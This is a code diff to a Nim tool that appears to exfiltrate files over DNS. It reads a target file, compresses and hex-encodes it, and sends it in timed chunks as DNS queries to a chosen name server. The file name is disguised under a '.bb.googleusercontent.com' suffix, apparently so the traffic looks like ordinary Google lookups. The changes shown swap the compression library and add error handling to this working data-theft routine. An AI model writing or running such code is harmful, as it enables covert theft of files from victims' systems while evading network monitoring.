@@ -1,6 +1,6 @@
 import std/[os, strutils, random, sha1]
 import pkg/ndns
-import zip/zlib
+import zippy
 randomize()
 
 proc resolvX(ns: string, data: string): void =
@@ -33,21 +33,24 @@ proc chuckX(ns: string, data: string, slp: int, domain = ""): void =
         sleep(slp)
 
 proc dnX(ns: string, file: string, slp: int): void =
-    let
-        content = readFile(file)
-        gz = compress(content, stream=RAW_DEFLATE)
-        filename = splitPath(file)
-        hash = secureHash(content)
-        hex = gz.toHex
+    try:
+        let
+            content = readFile(file)
+            gz = compress(content, BestSpeed, dfGzip)
+            filename = splitPath(file)
+            hash = secureHash(content)
+            hex = gz.toHex
 
-    echo "[+] Sending ", file, " [lengh: ", content.len, "][hash: ", hash, "]" 
+        echo "[+] Sending ", file, " [lengh: ", content.len, "][hash: ", hash, "]" 
 
-    chuckX(ns, toHex(filename.tail), slp, ".bb.googleusercontent.com")
-    chuckX(ns, hex, slp)
-    resolvX(ns, "quit")
+        chuckX(ns, toHex(filename.tail), slp, ".bb.googleusercontent.com")
+        chuckX(ns, hex, slp)
+        resolvX(ns, "quit")
 
-    echo "[+] Done!"
+        echo "[+] Done!"
 
+    except CatchableError as e:
+        echo "[!] Error: ", e.msg
 
 when isMainModule:
     if paramCount() < 3:
